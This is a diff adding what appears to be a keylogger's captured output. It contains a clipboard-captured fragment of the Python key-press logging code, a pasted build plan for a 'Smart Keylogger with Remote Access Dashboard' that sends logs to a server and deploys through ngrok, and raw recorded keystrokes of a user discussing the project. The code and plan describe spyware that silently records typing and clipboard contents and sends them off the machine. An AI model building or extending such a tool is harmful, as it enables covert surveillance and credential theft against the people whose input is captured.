@@ -1,0 +1,39 @@
+[📋 CLIPBOARD] def on_press(key):
+    try:
+        if hasattr(key, 'char') and key.char is not None:
+            write_log(key.char)
+        else:
+            raise AttributeError  # Force it to use special_keys
+    except AttributeError:
+        special_keys = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "\n",
+            keyboard.Key.tab: "\t",
+            keyboard.Key.backspace: "[BACKSPACE]",
+            keyboard.Key.shift: "",
+            keyboard.Key.shift_r: "",
+            keyboard.Key.ctrl: "",
+            keyboard.Key.ctrl_r: "",
+            keyboard.Key.cmd: "[WINDOWS]",
+            keyboard.Key.esc: "[ESC]",
+            keyboard.Key.caps_lock: "[CAPSLOCK]",
+        }
+        write_log(special_keys.get(key, f"[{str(key).replace('Key.', '').upper()}]"))
+
+yeah bro this works fine now all setyeah ok bro be ready with the day 5 content bro we need to mob=ve furtherno bro I [CAPSLOCK]m [BACKSPACE][BACKSPACE][BACKSPACE][CAPSLOCK] am telling about the nes[BACKSPACE]xt phase of the keylogger project
+
+[📋 CLIPBOARD] ✅ Let's Build the Project + Learn the Tools at the Same Time
+🔐 Project: Smart Keylogger with Remote Access Dashboard
+🧠 Learn-as-You-Build Plan (Customized for You):
+Week	Goal	Tools & Topics You'll Learn
+Day 1–2	What is a Keylogger? How does it work?	OS concepts, pynput for keyboard events
+Day 3–4	Start Coding the Keylogger	Python basics, saving logs, clipboard logging
+Day 5–6	Sending logs to a server	Networking in Python, requests, REST APIs
+Day 7–8	Build the Dashboard	Flask (Python Web Framework), HTML/CSS basics
+Day 9–10	Display logs + add user login	SQLite (for DB), Flask routes, forms
+Day 11–12	Add encryption + search filters	cryptography, AES, search & filter logic
+Day 13–14	Final polish + deploy	ngrok, documentation, testing
+
+
+
+i a,[BACKSPACE]m talkn[BACKSPACE]ing about this one brofirst gib=ve [BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE][BACKSPACE]ive me a recap on e[BACKSPACE]what we g[BACKSPACE]have done y[BACKSPACE]yi[BACKSPACE][BACKSPACE]till todayokay i will let you know once when I [CAPSLOCK]n[BACKSPACE][CAPSLOCK]am ready also dontk [BACKSPACE][BACKSPACE] forget that you need to tell me about how I a[BACKSPACE]can add this to my github repoyeah bro see you later[CTRL_L]
